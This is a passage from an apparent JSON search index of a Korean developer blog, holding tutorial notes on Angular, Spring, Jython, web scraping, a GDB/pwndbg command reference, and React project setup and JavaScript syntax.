대입한다.\r\u0026lt;h4\u0026gt;{{ product.price | currency }}\u0026lt;/h4\u0026gt;\r\u0026lt;p\u0026gt;{{ product.description }}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt; 문법 반복, 출력, 링크 \u0026lt;div *ngFor=\u0026#34;let product of products; index as productId\u0026#34;\u0026gt;\r/*\r*ngFor 은 반복을 뜻하는 예약어다. products 안의 원소를 하나씩 꺼내서 product 라 칭한다. 마치 java나 python의 ``for item in array`` 와 같다.\r\u0026#39;;\u0026#39; 로 구문을 구분할 수 있다.\rproductId 변수에 index를 대입한다.\r*/\r\u0026lt;a [title]=\u0026#34;product.name + \u0026#39; details\u0026#39;\u0026#34; [routerLink]=\u0026#34;[\u0026#39;/products\u0026#39;, productId]\u0026#34;\u0026gt;\r/*\r[title] 은 마우스를 올릴 때 나오는 텍스트를 뜻한다.\rrouterLink는 클릭시 넘어갈 링크이다. 링크를 []로 설정하면 []안의 내용을 appepnd 한 값을 의미한다. 즉 \u0026#34;/product/:productId\u0026#34; 의 주소를 나타낸다.\r\u0026#34;\u0026#34;안의 내용은 ts문법이고, 단순 텍스트는 \u0026#39;\u0026#39; 사이에 집어넣으면 된다.\r*/\r\u0026lt;h3\u0026gt;\r{{ product.name }} // product 객체의 name 필드를 출력한다.\r\u0026lt;/h3\u0026gt;\r\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt; 조건 \u0026lt;p *ngIf=\u0026#34;product.description\u0026#34;\u0026gt; // *ngIf는 조건문을 뜻하는 예약어다. product 객체에 description 필드가 존재하면 아래를 실행한다.\rDescription: {{ product.description }}\r\u0026lt;/p\u0026gt; 버튼 \u0026lt;button (click)=\u0026quot;share()\u0026quot;\u0026gt; (click)은 클릭 event 발생시 실행할 내용을 적는다. share()라는 함수를 실행하도록 연결한다.\n-\u0026gt; 요점 *ngFor *ngIf Interpolation {{ }} Property binding [ ] Event binding ( )\n","permalink":"https://aswinblue.github.io/Blog/post/webapplication/angular/","summary":"Angular Angular JS와 Angular는 다르다. Angular JS는 초창기 Angular를 의미하고, 그냥 Angular는 Angular2 이상의 버전을 의미한다. javascript기반의 textscript를 사용한다. 확장자가 ts로 끝난다. 개발환경 세팅 nodejs 설치 $ sudo apt install npm :nodejs와 npm 동시에 설치 angular client 설치 $ npm install -g @angular/cli 명령어를 이용하여 설치 workspace 생성 client 설치가 완료되었으면 workspace를 생성하고 application을 생성한다.\n$ ng new \u0026lt;application_name\u0026gt; 명령어를 이용하여 설치한다.\nnodejs 버전이 낮다고 한다. github에서 받아서 빌드하여 써 보자.","title":"Angular"},{"content":"Spring basic 설치 spring CLI를 설치한다. 직접 다운받아서 원하는 곳에 압축을 푼 후 PATH설정을 해 주는게 빠르다.\n참조 프로젝트 생성 CLI로 프로젝트를 생성해 보자. spring init --build=gradle -d=web -a=myApp -g=com.aswin.blue [location] --build=gradle 기본으로 maven을 사용하지만 gradle로 설정 가능하다. -d=web dependency를 web으로 설정 -a=myApp artifactId, 즉 project명을 설정한다. -g=com.aswin.blue 그룹 명을 설정한다. [location] 생성할 폴더를 지정한다. 없으면 새로 생성한다. 지정하지 않으면 zip 형태로 압축해서 생성한다. 설정 maven으로 프로젝트를 생성하면 pom.xml을 설정해야 한다. 각종 라이브러리를 플러그인 형태로 사용하려면 dependency와 repository 설정을해 줘야 한다. \u0026ldquo;https://mvnrepository.com/\u0026quot; 주소처럼 maven repository를 정리해 놓은 사이트에서 원하는 repository를 찾아서 dependency를 작성한다. repository 추가시 compile dependency를 확인하고 추가로 pom.xml을 작성한다. maven 사이트보다는 github의 readme를 더 신용하자, maven 사이트 업데이트가 안돼서 잘 동작하지 않는 것도 있다. 실행 maven 프로젝트의 실행에도 maven이 사용된다. mvn -X clean install exec:java -Dexec.args=\u0026quot;\u0026quot; 로 실행이 가능하다. -X 는 디버깅 로그 출력을 의미한다. -Dexec.args= 는 main 함수의 argv를 설정한다.\nspring 프로젝트는 mvn spring-boot:run 으로 실행시킬 수 있다. ","permalink":"https://aswinblue.github.io/Blog/post/webserver/spring/","summary":"Spring basic 설치 spring CLI를 설치한다. 직접 다운받아서 원하는 곳에 압축을 푼 후 PATH설정을 해 주는게 빠르다.\n참조 프로젝트 생성 CLI로 프로젝트를 생성해 보자. spring init --build=gradle -d=web -a=myApp -g=com.aswin.blue [location] --build=gradle 기본으로 maven을 사용하지만 gradle로 설정 가능하다. -d=web dependency를 web으로 설정 -a=myApp artifactId, 즉 project명을 설정한다. -g=com.aswin.blue 그룹 명을 설정한다. [location] 생성할 폴더를 지정한다. 없으면 새로 생성한다. 지정하지 않으면 zip 형태로 압축해서 생성한다. 설정 maven으로 프로젝트를 생성하면 pom.xml을 설정해야 한다.","title":"Spring basic"},{"content":"Jython Java 환경에서 python을 실행하게 하는 방법 중 하나 역으로 Jython 환경에서 java를 실행 가능하기도 하다. spring에서 jython을 사용하는 방법에 대해 묘사하겠다. 설치 pom.xml에 의존성을 작성한다. pom을 사용하면 jython을 설치하지 않고 일부 동작이 실행되게 할 수 있지만, 외부 모듈 사용에는 제한적인 부분이 있기에 설치가 필요하면 설치를 해야한다. \u0026lt;!-- https://mvnrepository.com/artifact/org.python/jython --\u0026gt;\r\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.python\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;jython\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;2.7.0\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; 실행 PythonInterpreter 을 선언한다. 이후 execfile, exec 함수를 이용하여 python 문법을 사용 가능하다. PythonInterpreter jython;\rjython.execfile(PYTHON);\rjython.exec(\u0026#34;print(1+1)\u0026#34;); execfile로 특정 함수를 정의하였다면 그 아래에 있는 exec함수에서 함수를 호출할 수도 있다. ","permalink":"https://aswinblue.github.io/Blog/post/java/jython/","summary":"Jython Java 환경에서 python을 실행하게 하는 방법 중 하나 역으로 Jython 환경에서 java를 실행 가능하기도 하다. spring에서 jython을 사용하는 방법에 대해 묘사하겠다. 설치 pom.xml에 의존성을 작성한다. pom을 사용하면 jython을 설치하지 않고 일부 동작이 실행되게 할 수 있지만, 외부 모듈 사용에는 제한적인 부분이 있기에 설치가 필요하면 설치를 해야한다. \u0026lt;!-- https://mvnrepository.com/artifact/org.python/jython --\u0026gt;\r\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.python\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;jython\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;2.7.0\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; 실행 PythonInterpreter 을 선언한다. 이후 execfile, exec 함수를 이용하여 python 문법을 사용 가능하다. PythonInterpreter jython;\rjython.","title":"Jython"},{"content":"Web Scrapping x-path /a/b/c/d/e/f/g/... 와 같이 특정 경로를 가진 개체를 가리키는 방법이다. //*[@id=\u0026quot;abcd\u0026quot;] // 는 모든 경로에서 찾겠다는 의미 는 모든 태그에 대해 찾겠다는 의미. *대신 TAG를 넣으면 \u0026lsquo;TAG\u0026rsquo; 라는 이름의 태그를 가진 항목에서만 검색함 @id=\u0026ldquo;abcd\u0026rdquo; 는 id라는 속성이 abcd 인 항목을 찾겠다는 의미 브라우저에서 자동으로 해줒기 때문에 보통은 걱정할 필요가 없다. 정규식 . : 하나의 문자 ^ : 문자열의 시작 $ : 문자열의 끝 * : 모든 문자 # : 하나의 숫자 정규식 참조 link\nUseragent 특정 페이지에서는 request 헤더를 확인하여 매크로 접속을 막는 경우가 있다. 서버에서는 useragent 정보를 확인하여 접속하는 웹 브라우저, 기기 등의 정보를 확인할 수 있다. 참조 https://www.youtube.com/watch?v=yQ20jZwDjTE https://www.w3schools.com/python/python_regex.asp\n","permalink":"https://aswinblue.github.io/Blog/post/developtips/web_scrapping/","summary":"Web Scrapping x-path /a/b/c/d/e/f/g/... 와 같이 특정 경로를 가진 개체를 가리키는 방법이다. //*[@id=\u0026quot;abcd\u0026quot;] // 는 모든 경로에서 찾겠다는 의미 는 모든 태그에 대해 찾겠다는 의미. *대신 TAG를 넣으면 \u0026lsquo;TAG\u0026rsquo; 라는 이름의 태그를 가진 항목에서만 검색함 @id=\u0026ldquo;abcd\u0026rdquo; 는 id라는 속성이 abcd 인 항목을 찾겠다는 의미 브라우저에서 자동으로 해줒기 때문에 보통은 걱정할 필요가 없다. 정규식 . : 하나의 문자 ^ : 문자열의 시작 $ : 문자열의 끝 * : 모든 문자 # : 하나의 숫자 정규식 참조 link","title":"Web_scrapping"},{"content":"GDB GNU Debugger의 약자 유닉스의 디버거는 오픈소스가 아니라 GNU에서 새로 개발한 디버거 디버깅을 위해서는 register(레지스터 값), disassem(rip 부근 주소를 디스어셈 한 값), stack(스택의 값), backtrace(현재 rip에 도달 할 때 까지 거쳐간 함수들) 을 파악해야 하며, 이를 context(맥락) 이라 한다. pwndbg 플러그인을 설치하면 hacking에 관련된 내용을 디버깅하기 용이하다. https://github.com/pwndbg/pwndbg 주소에서 git을 clone 받고, ./setup.sh를 실행시키면 이후 gdb 명령을 칠 때 자동으로 pwndbg 플러그인이 적용된 gdb가 실행된다. 컴파일 gcc로 컴파일시 옵션에 -g 를 붙여야 소스를 보면서 디버깅이 가능 리눅스에서 컴파일한 파일은 ELF (Executable and Linkable Format) 의 실행 파일이 된다. ELF 파일은 파일 실행에 필요한 정보가 든 헤더와 여러 섹션들로 구성된다. 섹션에는 기계어 코드 등의 정보들이 들어있다. readelf -h [ELF파일] 명령으로 ELF 파일의 헤더 정보를 확인 할 수 있다. gdb 옵션 gdb [파일이름] : 해당 파일이름 디버깅 실행 --args [arg1] [arg2] [...] : 파일 실행에 필요한 argument를 전달 기타 명령어 실행 전 설정사항 coredumb 파일\n프로그램이 비정상적으로 종료될 때 메모리의 현재 상황을 블랙박스처럼 남기는 coredump 파일이 생성된다.다만, coredump 파일 생성에는 사전에 설정이 필요하다. ulimit -c unlimited 로 coredump 파일의 크기를 무제한으로 설정한다. 리눅스 프롬프트에서 ulimit -a 명령을 입력 해 보면 각종 파일들의 크기 설정을 볼 수 있다. core file size 가 보통 기본 0으로 설정되어 있다. coredump 생성 경로를 확인한다. 경로로 설정된 디렉터리가 존재하지 않을 경우 생성되지 않을 수 있다. 리눅스에는 보통 /proc/sys/kernel/core_pattern 파일에 corefile 생성 포멧(경로)가 세팅되어 있다. 해당 파일을 확인하여 core 파일 생성 경로를 획득한다. (리눅스 버전에 따라 /var/lib/apport/coredump/, /mnt/wslg/dumps/core 등의 디렉터리에 core 파일이 생성된다.) 이후에는 프로그램 실행 중 비정상적으로 종료가 되면 core 라는 이름의 파일이 생성된다. gdb에서 core파일을 사용하여 디버깅을 할 수 있다. 디버깅 심벌이 있는 실행파일과, core파일이 있다면, gdb 실행파일 CORE파일 라고 입력 해 주면 gdb는 프로그램이 죽은 시점 까지 동작을 수행하고 break 한다. 이때 gdb의 bt 명령으로 stack을 확인할 수도 있다. gdb 의 TUI 모드를 다운받아 사용하면 코드의 어떤 라인에서 core dump 가 발생헀는지 확인 가능하다. 환경 변수 설정\nset env 명령으로 환경변수 설정 가능 set env LD_PRELOAD {PATH} 명령으로 LD_PRELOAD 환경변수를 설정하여 라이브러리 참조 경로를 설정 할 수 있다. 실행중인 프로세스 디버깅\ngdb attach -p {PROCESS_ID} : 쉘에서 ps 명령어 입력시 나오는 PROCESS_ID 를 사용하여 현재 실행중인 프로세스를 디버깅 할 수 있다. 디버깅 중 명령어 breakpoint b \u0026lt;라인\u0026gt; : 해당 라인에 breakpoint 설정 (break와 동일) b \u0026lt;함수명\u0026gt; : 해당 함수 시작점에 breakpoint 설정 b \u0026lt;파일명\u0026gt;:\u0026lt;라인\u0026gt; : 특정 파일 해당 라인에 breakpoint (ex : b test.cpp:10) b \u0026lt;라인\u0026gt; \u0026lt;조건문\u0026gt; : 특정 조건일 때 해당 라인에 breakpoint 작동 (ex: break 25 if x==0 x가 0일때만 25번 라인에서 break) b *\u0026lt;주소\u0026gt; : 주소를 중단점으로 설정하고싶다면 *을 앞에 붙여준다 tb : 임시 중단점 설정, 일회성 w \u0026lt;변수\u0026gt; : 조사식에 해당 변수 추가하고, 실행 중 조사식에 담긴 변수들의 값이 변할 때 마다 자동으로 break (watch와 동일) 로컬 변수는 해당 변수를 확인할 수 있는 scope에 들어가서 지정할 수 있다. i b : breakpoint 모두 확인 (info breakpoint 와 동일) d : 모든 brekapoint 삭제 (delete와 동일) d [index] : 특정 breakpoint 삭제 cl [라인] : 해당 라인의 brekapoint 삭제 cl [함수] : 해당 함수의 breakpoint 삭제 cl : 모든 breakpoint 삭제 enable [index] : 해당 brekapoint 활성화 disable [index] : 해당 breakpoint 비활성화 condition [index] [조건] : 해당 breakpoint는 조건을 만족할 때에만 동작 (ex : condition 2 var_a == 0) catch : 특정 조건이 되면 프로세스를 정지시킴 catch syscall [system call 이름] : 시스템 콜이 동작하면 프로세스 정지 실행 file [파일이름] : 해당 파일 이름 디버깅 실행 r [arg1] [arg2] [...]: 지정된 파일을 argument와 함께 실행 (run과 동일) run 명령은 breakpoint를 설정해 놓지 않으면 프로그램을 끝까지 실행하고 종료한다. start 명령은 아무런 breakpoint가 없어도 자동으로 시작지점에서 한번 정지한다. r $() : 쉘 프롬프트를 실행, 표준출력 결과를 인자로 프로그램 실행 r \u0026lt;\u0026lt;\u0026lt; $() : 프로그램 실행시 표준 입력으로 필요한 데이터를 $() 안의 쉘 프롬프트 표준 출력 결과로 대체한다. ex: r \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026quot;print('hello world')\u0026quot;) : 프로그램 실행 후 표준 입력으로 \u0026ldquo;hello world\u0026rdquo; 전달 c : 다음 breakpoint로 진행 (continue 와 동일) n [숫자] : 해당 숫자만큼 다음 라인으로 진행. 숫자 생략가능 (next와 동일) s [숫자] : 다음 라인이 함수라면 함수 내부로 이동. 해당 숫자만큼 진행. 숫자 생략 가능 (step 과 동일) k : 실행중인 프로그램 종료 set \u0026lt;변수\u0026gt;=\u0026lt;값\u0026gt; : 특정 변수에 강제로 값을 집어넣음 set {타입}\u0026lt;주소\u0026gt;=\u0026lt;값\u0026gt; : 특정 타입의 값을 해당 주소에 집어넣음 (ex: set {int} 0x123456 = 10 : 0x123456 주소에 10이라는 int값 주입) entry : 프로그램의 첫 실행지점을 break point 로 잡고 디버깅을 실행시킨다. start 명령과 동일한 효과 finish : 현재 실행중인 함수를 종료시키고 함수 호출지점 다음으로 이동 (fin 으로 사용 가능) set solib-search-path \u0026lt;LIBRARY_PATH\u0026gt; : shared library 파일을 찾을 경로를 추가로 설정 확인 entry : pwngdb 에서 stack, register, disasm 화면을 출력 l : main을 기점으로 소스 출력 (list와 동일) l [라인] : 해당 라인을 기점으로 소스 출력 l [함수] : 해당 함수를 기점으로 소스 출력 info locals : 지역변수들 확인 info variables : 전역변수 확인 info addr [함수이름] : 함수 주소 확인 info register [레지스터 이름] : 레지스터 값 확인 p [변수] : 변수 값 확인 p \u0026amp;[변수] : 변수 주소값 확인 p $[레지스터 이름] : 레지스터 값 확인 p *[배열]@[숫자] : 해당 숫자만큼 배열의 값 출력 p [구조체] : 구조체 주소 확인 p *[구조체] : 구조체 전체 값 확인 p *[구조체].인자 : 구조체 인자 값 확인 (ex: p *s1.name : s1 구조체의 name필드 값 확인) linked list 는 포인터를 계속 참조할 수 있음 (ex: p s1.next-\u0026gt;next-\u0026gt;next-\u0026gt;name) p \u0026lt;함수\u0026gt; : 함수 실행 결과를 확인 p/t var : var 변수를 2진수로 출력 p/o var : var 변수를 8진수로 출력 p/d var : var 변수를 부호가 있는 10진수로 출력 (int) p/u var : var 변수를 부호가 없는 10진수로 출력 (unsigned int) p/x var : var 변수를 16진수로 출력 p/c var : var 변수를 최초 1바이트 값을 문자형으로 출력 p/f var : var 변수를 부동 소수점 값 형식으로 출력 p/a addr : addr주소와 가장 가까운 심볼의 오프셋을 출력 x \u0026lt;메모리주소\u0026gt; : 메모리값 확인 x $\u0026lt;레지스터\u0026gt; : 레지스터 주소 확인 x $pc : program counter (다음 실행할 명령어 번지) 확인 x 뒤에 \u0026lsquo;/\u0026rsquo; 를 입력하여 옵션을 추가 할 수 있다. x/o : 8진법으로 표시 x/x : 16진법으로 표시 x/u : 10진법으로 표시 x/t : 2진법으로 표시 x/b : 1 byte 단위로 표시(byte) x/h : 2 byte 단위로 표시(half word) x/w : 4 byte 단위로 표시(word) x/g : 8 byte 단위로 표시(giant) x/i : 역어셈블된 기계여 표시 x/c : ASCII 표의 바이트 표시 x/s : 문자 데이터의 전체 문자열을 표시. ex1) x/4wx : 주소값부터 다음 네 개의 주소를 4byte씩 16진수로 표시 ex2) x/10gx : 주소값부터 다음 80byte를 8byte씩 16진수로 표시 i : info 의 단축어로, 각종 정보를 확인할 때 사용한다. i b : break point 확인 i addr 변수명 : 변수의 주소 확인 i var 변수명 : 변수 관련 내용 출력 i r : 레지스트 값 모두 확인 (info registers 와 동일) bt : 프로그램 중단시 최종 스택 프레임을 출력 (backtrace와 동일) display [변수명] : 변수 값을 매번 화면에 디스플레이 display/[출력형식] [변수명] : 변수 값을 출력 형식으로 디스플레이 undisplay [디스플레이번호] : 디스플레이 설정을 없앤다 disable display [디스플레이번호] : 디스플레이를 일시 중단한다. enable display [디스플레이번호] : 디스플레이를 다시 활성화한다. f [인덱스] : stack frame에서 인덱스에 해당하는 함수로 포커스를 변경한다. 0번이 가장 최근에 호출된 함수이며, 인덱스를 생략하면 0번 함수가 선택된다. (frame 과 동일)` 포커스를 변경한다는 말은, 해당 함수 stack 내부에 선언된 로컬 변수 등을 참조할 수 있다는 뜻이다. pd : rip 주변의 기계어를 어셈블리로 번역하여 출력한다. pdisas 의 축약으로, debugger에 따라 disiassemble 로 동작하는 경우도 있다. tele : telescope의 축약으로 rsp 주변의 메모리를 덤프함과 동시에 메모리에 담긴 주소를 참조하여 그 안에 담긴 값도 함께 보여준다. tele 주소 : 주소 기준으로 메모리 stack 출력 vmmap : 가상 메모리 레이아웃을 보여줌 코드 여영역의 주소와 라이브러리 영역의 주소를 확인 할 수 있음 ELF 가 적용된 코드의 code_base, ASLR 이 적용된 코드의 libc_base 를 확인할 수 있다. search TARGET : TARGET 이 포함된 byte sequences, 문자열, 포인터, 혹은 정수가 저장된 주소를 반환한다. disass 함수이름 : 함수를 어셈블리어로 풀어 쓴 내용을 출력한다. heap : 동적할당 및 할당 해제된 heap 영역의 chunk 들을 확인 할 수 있다. 기타 q : 종료 got : got 내용을 출력 plt : plt 내용을 출력 finish : 함수를 종료시키고 함수 호출 부분으로 이동 (step 의 반대) TUI mode 특정 코드를 gdb와 연동시켜 디버깅 중 어셈블리 코드의 RIP 레지스터가 가리키는 라인을 코드에서 볼 수 있게 하는 기능이다. gdb 를 실행시킨 후 dir 명령으로 코드가 있는 곳의 위치를 설정한다. 이후 tui enable 명령으로 tui 모드를 세팅하고, 실시간으로 코드를 확인 할 수 있다. tui diable 명령으로 tui 창을 제거할 수 있다. ","permalink":"https://aswinblue.github.io/Blog/post/c++/gdb/","summary":"GDB GNU Debugger의 약자 유닉스의 디버거는 오픈소스가 아니라 GNU에서 새로 개발한 디버거 디버깅을 위해서는 register(레지스터 값), disassem(rip 부근 주소를 디스어셈 한 값), stack(스택의 값), backtrace(현재 rip에 도달 할 때 까지 거쳐간 함수들) 을 파악해야 하며, 이를 context(맥락) 이라 한다. pwndbg 플러그인을 설치하면 hacking에 관련된 내용을 디버깅하기 용이하다. https://github.com/pwndbg/pwndbg 주소에서 git을 clone 받고, ./setup.sh를 실행시키면 이후 gdb 명령을 칠 때 자동으로 pwndbg 플러그인이 적용된 gdb가 실행된다. 컴파일 gcc로 컴파일시 옵션에 -g 를 붙여야 소스를 보면서 디버깅이 가능 리눅스에서 컴파일한 파일은 ELF (Executable and Linkable Format) 의 실행 파일이 된다.","title":"GDB"},{"content":"React basic 개발환경 설치 및 실행 node.js 로 만들어진 create-react-app 툴을 이용하면 손쉽게 react 앱을 생성할 수 있다. npm을 설치하고 아래 명령어를 수행하여 create-react-app을 설치한다. npm install -g create-react-app 원하는 경로에 들어가 프로젝트를 생성한다. create-react-app \u0026lt;NAME\u0026gt; : NAME 경로에 프로젝트 생성 주의 : 프로젝트가 생성되는 폴더명은 대문자를 사용할 수 없다. 실행 npm run start 를 수행하면 localhost:3000에서 웹페이지를 퍼블리싱한다. 기본 설정 실행 포트 package.json 파일에서 \u0026quot;proxy\u0026quot;: \u0026quot;http://localhost:3000/\u0026quot; 과 같이 입력하면 실행시 포트를 3000으로 설정할 수 있다. 기본 구조 /public/index.html 에서 기본 화면 구성 \u0026lsquo;root\u0026rsquo; 이름으로 된 division이 있는데, 이 division에 대한 설정은 javascript로 정의되어있다. src 경로에 javascript파일들 구성 \u0026lsquo;index.js\u0026rsquo; 에 메인 화면에 사용된 객체가 정의되어 있다. 아래 내용은 id가 \u0026lsquo;root\u0026rsquo; 인 division에 \u0026lsquo;App\u0026rsquo;을 적용하겠다는 의미이다.\nReactDOM.render(\r\u0026lt;React.StrictMode\u0026gt;\r\u0026lt;App /\u0026gt;\r\u0026lt;/React.StrictMode\u0026gt;,\rdocument.getElementById(\u0026#39;root\u0026#39;)\r); \u0026lsquo;index.js\u0026rsquo;에서 \u0026lt;App/\u0026gt; 라 되어있는 사용자 정의 태그를 생성했는데, App은 \u0026lsquo;App.js\u0026rsquo;에 정의되어 있고, \u0026lsquo;index.js\u0026rsquo;에서 \u0026lsquo;App.js\u0026rsquo;를 참조한다.\n\u0026lsquo;App.js\u0026rsquo;에서 선언된 \u0026lsquo;App\u0026rsquo; 이라는 이름의 함수가 반환하는 값이 \u0026lsquo;App\u0026rsquo;태그에 치환된다고 보면 된다.\n\u0026lsquo;App\u0026rsquo;이 함수가 아니라 class로 정의되어 있다면 \u0026lsquo;App\u0026rsquo; class의 \u0026lsquo;render()\u0026rsquo; 함수의 리턴값이 \u0026lsquo;App\u0026rsquo;태그로 치환된다.\n리턴값은 무조건 특정 태그 안에 들어가 있어야 한다. 태그로 감싸주도록 한다.\nsrc경로에 css파일 구성 index.css에서 css설정 구성 디렉터리 src 하위에 디렉터리를 만들 수 있고, 각 디렉터리에는 index.jsx 파일을 넣을 수 있다.\nindex.js 파일은 아래와 같이 디렉터리 안의 파일들에서 export 된 내용들을 export한다.\n// src/component/index.js\rexport { default as Navbar } from \u0026#39;./Navbar\u0026#39;; // src/component/Navbar.jsx에서 Navbar을 default로 export한 경우\rexport { Footer } from \u0026#39;./Footer\u0026#39;; // src/component/Footer.jsx에서 Footer을 export한 경우 이렇게 export 된 내용들을 다른 폴더에서는 디렉터리만 import 하고 해당 모듈을 사용할 수 있다.\n// src/App.js\rimport { Navbar Footer } from component ❗ 단, index.js에 의해 세팅이 되는 시점이 App.js가 랜더 되는 시점보다 느리다는점에 주의한다. 아래는 이 문제로 발생할 수 있는 오류.\n// component/index.js\rexport { default as Button } from \u0026#39;./Button\u0026#39;\r// App.js\rimport Navbar from \u0026#39;./component/Navbar\u0026#39; // navbar을 import하는 라인이 먼저 호출됨\r// component/Navbar.js\rimport { Button } from \u0026#39;.\u0026#39; // button을 import하기 전에 App.js에서 Navbar을 호출했기 때문에 오류 발생, App.js를 구성하지 못해 빈 화면이 보여짐 모듈 import / export 특정 모듈을 export하고, 이를 다른 파일에서 import하여 사용할 수 있다. export 방법으로는 default 방법과, 일반 방법이 있습니다. default 방법\n// A.jsx\rexport default A; // import A from \u0026#39;./A\u0026#39;\r// 혹은 import B from \u0026#39;./A\u0026#39;도 가능\rexport {default as A}; // import {A} from \u0026#39;./A\u0026#39; 일반 방법\n// A.jsx\rexport { A }; // inport { A } from \u0026#39;./A\u0026#39; 위 두가지 예시를 보면 알겠지만, default로 export를 하면 다른 파일에서 import를 할 때 중괄호 없이 import가 가능하며, 그 이름도 아무렇게나 정할 수 있다.\ndefault 없이 export를 하면 중괄호 안에서 받아야 하며, 변수 명도 동일해야 한다.\nimport나 export에는 wildcard * 을 사용할 수 있다. export * from \u0026#39;./A\u0026#39; // 보통 index.jsx에서 사용\rimport * as A from \u0026#39;./A\u0026#39; // A.jsx에서 export한 것들을 모두 받아와 A로 사용.\r// 받아온 컴포넌트는 A.name, A.number 와 같이 사용하게 됨 배포 npm run start로 \u0026lsquo;create-react-app\u0026rsquo;으로 만든 앱을 실행시킬 수는 있지만, 이는 개발자용 실행 방식이다. 웹 브라우저에서 페이지에 접속하고 다운로드받은 용량을 확인해보면 아무 기능이 없어도 MB단위가 다운받아짐을 확인할 수 있다. 이러한 상태로 배포를 하면 효율 및 보안 관점에서 적합하지 않다. npm run build 명령어를 수행하면 \u0026lsquo;build\u0026rsquo;라는 새로운 디렉터리와 데이터들이 생성된다. \u0026lsquo;build\u0026rsquo; 안에 있는 파일들은 공백 등을 제거하여 용량 및 보안에 최적화된 상태로 제공된다. 배포시에는 \u0026lsquo;build\u0026rsquo;디렉터리 안의 내용을 사용하면 된다. 웹서버의 최상위 디렉터리를 \u0026lsquo;build\u0026rsquo;로 설정하면 된다. npm install serve 명령어로 serve 툴을 설치한다. serve는 웹서버를 실행시키는 도구이다. serve -s build 명령어로 \u0026lsquo;build\u0026rsquo; 디렉터리를 root 디렉터리로 웹서버를 실행한다. 만약 vsCode 사용 중 \u0026ldquo;이 시스템에서 스크립트를 실행할 수 없으므로 \u0026hellip;\u0026rdquo; 문구가 발생한다면, 콘솔에서 설정을 변경해야 한다. 관리자코드로 vsCode를 실행시킨 후, 콘솔 창에 Set-ExecutionPolicy RemoteSigned 를 입력한다. 이후 get-ExecutionPolicy 를 입력하여 결과값이 RemoteSigned 가 나오는지 확인한다. 이후에는 정상적으로 serve 명령이 동작함을 확인 할 수 있다. 보통은 이렇게 일일이 작업을 수행하지 않고, npm run deploy 명령으로 package.json 파일에 기록된 설정대로 배포 작업을 자동화시킨다. github에 배포 create-react-app으로 프로젝트 생성 : create-react-app \u0026lt;NAME\u0026gt; gh-pages 설치(이미 설치시 생략가능) : npm install -g gh-pages git hub에서 원하는 이름으로 repository 생성( 이후 {repo-name} 로 지칭) 생성된 git repository와 react 폴더 연동한다. git init git remote add origin {your-repository-url} package.json파일 수정 ({username}은 github 계정 이름) \u0026ldquo;homepage\u0026rdquo; : \u0026ldquo;http://{username}.github.io/{repo-name}\u0026rdquo; \u0026ldquo;scripts\u0026rdquo;: {\u0026ldquo;predeploy\u0026rdquo;: \u0026ldquo;npm run build\u0026rdquo;, \u0026ldquo;deploy\u0026rdquo;: \u0026ldquo;gh-pages -d build\u0026rdquo;} 배포를 실행한다. npm run deploy gh-pages 라는 branch를 자동으로 생성하고, package.json에 설정한 \u0026lsquo;homepage\u0026rsquo; 주소에 react 페이지가 업로드된 것을 볼 수 있다. 문법 주석 React 는 react code(typescript)와 JSX(xml) 코드가 있다. typescript에서는 \u0026lsquo;//\u0026rsquo; 혹은 \u0026lsquo;/* */\u0026rsquo; 로 주석을 사용한다. JSX에서는 \u0026lsquo;{/* */}\u0026rsquo; 로 주석을 사용한다. 함수 일반 함수 javascript와 동일하게 선언 가능하다.\nfunction Subject() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;a href=\u0026#34;/\u0026#34; onClick={ function(e) {\re.preventDefault();\rthis.props.onChangePage(); // 상위 컴퍼넌트로 부터 받은 함수 실행\r}\r\u0026lt;/div\u0026gt;\r); arrow 함수 FUNCTION_NAME = (VARIABLES) =\u0026gt; { BODY } 형태로 이루어져 있다.\nVARIABLES는 \u0026lsquo;,\u0026lsquo;로 나누어져 두개 이상의 인자를 선언할 수 있고, BODY에서 사용될 수 있다.\n위 함수를 호출하려면 FUNCTION_NAME(VARIABLES) 형태로 호출 가능하다.\nhighlightSquares = i =\u0026gt; {\rif (this.props.winningSquares.length \u0026gt; 0) {\rif (this.props.winningSquares.indexOf(i) \u0026gt; -1) {\rreturn \u0026#34;square winningSquares\u0026#34;;\r} else {\rreturn \u0026#34;square\u0026#34;;\r}\r} else {\rreturn \u0026#34;square\u0026#34;;\r}\r}; arrow 함수는 javascript를 반환할 수도 있고, html을 반환할 수도 있다. 방법은 아래와 같이 구분된다.\nconst js = () =\u0026gt; { // 함수 내용 }\rconst html = () =\u0026gt; ( // html ) 변수 hoisting : javascript에서는 변수를 scope(함수 혹은 블록)의 가장 위로 끌어올려서, 먼저 선언된것처럼 인식하는 기능이 있다. var var는 function-scoped 변수이다. 함수가 끝나기까지 해당 변수는 유지된다. (hoisting)\nvar를 block-scoped로 낮추기 위해서는 IIFE, \u0026lsquo;use strict\u0026rsquo; 등의 방법을 사용할 수도 있지만 let으로 선언하는게 빠르다.\nfunction TEST() {\rfor (var i = 0; i \u0026lt; 10; i++) {\rconsole.log(\u0026#39;i: \u0026#39;, i); // 정상출력\r}\rconsole.log(\u0026#39;i: \u0026#39;, i); // 정상출력\r}\rconsole.log(\u0026#39;i: \u0026#39;, i); // 오류 동일한 이름의 변수를 재선언할 수 있고, hoisting에 의해 나중에 선언한 변수를 먼저 사용할수도 있다. (오류를 일으키기 좋은 허용이다)\nvar A = 1\rvar A = 2 // 가능\rstr=\u0026#39;abcd\u0026#39; // 가능\rvar str let es2015에서 추가된 문법\n재선언 불가능\nhoisting 동작 안함\nlet A = 1\rlet A = 2 // 불가능\rA = 3 // 가능\rstr=\u0026#39;abcd\u0026#39; // 불가능\rlet str const es2015에서 추가\n선언과 동시에 값 할당 필요, 재정의 불가능\nhoisting 동작 안함\nconst A = 1\rconst A = 2 // 불가능\rA = 3 // 불가능\rstr=\u0026#39;abcd\u0026#39; // 불가능\rconst str // 불가능 선언없이 정의 아무 타입을 붙이지 않고 선언하면 전역변수로 